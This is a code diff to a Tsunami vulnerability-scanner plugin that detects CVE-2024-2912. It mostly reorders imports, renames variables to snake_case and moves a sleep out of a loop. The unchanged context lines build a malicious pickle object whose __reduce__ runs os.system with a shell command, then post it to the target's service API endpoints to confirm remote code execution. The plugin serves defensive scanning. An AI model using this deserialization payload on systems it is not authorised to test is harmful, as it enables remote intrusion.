@@ -12,20 +12,20 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 """A Tsunami plugin for detecting CVE-2024-2912."""
-import pickle
-import time
 from absl import logging
-from google.protobuf import timestamp_pb2
-import tsunami_plugin
 from common.data import network_endpoint_utils
 from common.data import network_service_utils
 from common.net.http.http_client import HttpClient
 from common.net.http.http_headers import HttpHeaders
 from common.net.http.http_request import HttpRequest
+from google.protobuf import timestamp_pb2
 from plugin.payload.payload_generator import PayloadGenerator
 import detection_pb2
 import payload_generator_pb2 as pg
+import pickle
 import plugin_representation_pb2
+import time
+import tsunami_plugin
 import vulnerability_pb2
 
 _VULN_DESCRIPTION = (
@@ -117,11 +117,11 @@ class Cve20242912Detector(tsunami_plugin.VulnDetector):
         )
         try:
             response = self.http_client.send(request, network_service)
-            for pathName in response.body_json()["paths"]:
-                for httpMethod in response.body_json()["paths"][pathName]:
-                    for tags in response.body_json()["paths"][pathName][httpMethod]["tags"]:
+            for path_name in response.body_json()["paths"]:
+                for http_method in response.body_json()["paths"][path_name]:
+                    for tags in response.body_json()["paths"][path_name][http_method]["tags"]:
                         if tags == "Service APIs":
-                            paths_and_methods.append([pathName, httpMethod])
+                            paths_and_methods.append([path_name, http_method])
         except Exception:  # pylint: disable=broad-exception-caught
             logging.exception('Unable to query %s', url)
 
@@ -144,7 +144,7 @@ class Cve20242912Detector(tsunami_plugin.VulnDetector):
                 return os.system, (f'/bin/sh -c "{payload.get_payload()}"',)
 
         rce_command = pickle.dumps(Payload())
-        responsesBody = []
+        responses_body = []
         for path_and_method in paths_and_methods:
             url = self._BuildUrl(network_service, path_and_method[0])
             request = (
@@ -159,13 +159,13 @@ class Cve20242912Detector(tsunami_plugin.VulnDetector):
             )
             try:
                 response = self.http_client.send(request, network_service)
-                responsesBody.append(response.body)
+                responses_body.append(response.body)
             except Exception:  # pylint: disable=broad-exception-caught
                 logging.exception('Unable to query %s', url)
-            time.sleep(_SLEEP_TIME_SEC)
-            for responseBody in responsesBody:
-                if payload.check_if_executed(responseBody):
-                    return True
+        time.sleep(_SLEEP_TIME_SEC)
+        for responseBody in responses_body:
+            if payload.check_if_executed(responseBody):
+                return True
         return False
 
     def _BuildUrl(self, network_service: tsunami_plugin.NetworkService, vulnerable_path) -> str:
